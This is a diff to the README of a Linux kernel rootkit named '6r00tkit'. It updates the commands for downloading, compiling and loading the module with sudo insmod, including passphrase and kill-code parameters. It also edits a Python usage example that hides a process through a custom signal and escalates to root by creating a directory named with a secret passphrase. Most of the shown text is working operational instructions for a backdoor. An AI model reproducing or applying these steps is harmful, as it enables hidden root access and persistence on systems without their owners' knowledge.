@@ -24,7 +24,7 @@ How it's works:
 wget https://github.com/mauricelambert/6r00tkit/archive/refs/heads/main.zip
 unzip main.zip
 cd 6r00tkit-main/
-make
+bash compile.sh
 ```
 
 ## Load
@@ -32,13 +32,13 @@ make
 ### Default parameters
 
 ```bash
-sudo insmod ./rootkit.ko
+sudo insmod ./6r00tkit.ko
 ```
 
 ### Add parameters
 
 ```bash
-sudo insmod ./rootkit.ko modulename="other_rootkit" passphrase="s3cr3t" killcode=666
+sudo insmod ./6r00tkit.ko modulename="other_rootkit" passphrase="s3cr3t" killcode=666
 ```
 
 ## Usages
@@ -49,17 +49,17 @@ You can use it like the following with python (or use it with any program and sc
 from os import mkdir, getuid, kill, listdir, getpid, system
 
 print("PID:", getpid())
-print("\n".join(listdir(f"/proc/{getpid()}")))
+print("\n".join(listdir("/proc/")))
 system("ps aux | grep python")
 kill(getpid(), 14600) # i use the default signal, you should use your own signal if added as parameters on load
-print("\n".join(listdir(f"/proc/{getpid()}")))
+print("\n".join(listdir("/proc/")))
 system("ps aux | grep python")
 
 print("Current UID:", getuid())
-system("whoiam")
+system("whoami")
 mkdir("1 4m 6r00t") # i use the default passphrase, you should use your own passphrase if added as parameters on load
 print("Current UID:", getuid())
-system("whoiam")
+system("whoami")
 ```
 
 ## Licence
